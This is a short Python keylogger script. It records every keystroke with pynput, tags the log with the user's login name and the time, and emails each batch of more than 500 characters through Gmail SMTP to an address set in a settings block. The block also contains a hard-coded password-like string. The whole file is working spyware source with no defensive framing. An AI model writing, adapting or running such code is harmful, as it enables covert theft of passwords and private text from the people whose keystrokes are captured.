from pynput.keyboard import Key ,Listener 
import time, os ,smtplib
#########Settings########

yourgmail=""                                        #What is your gmail?
yourgmailpass="gzlanhuekgympeygp"                                                #What is your gmail password
sendto="su"                                           #Where should I send the logs to? (any email address)


########################
v=""
def on_press(key):
    global v
    if (len(v)>500):
        v=v+str(key)
        b="The report from PC:-{} at time:-{} data is:-{}".format(os.getlogin(),str(time.ctime(time.time())),v)
        print(b)
        mail(v)
        v=""
    else:
        v=v+str(key)
def mail(b):
    s=smtplib.SMTP('smtp.gmail.com',587)
    s.starttls()
    s.login(yourgmail,yourgmailpass)
    s.sendmail(yourgmail,sendto,b)
    s.quit()
def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press,on_release=on_release) as l:
    l.join()
    
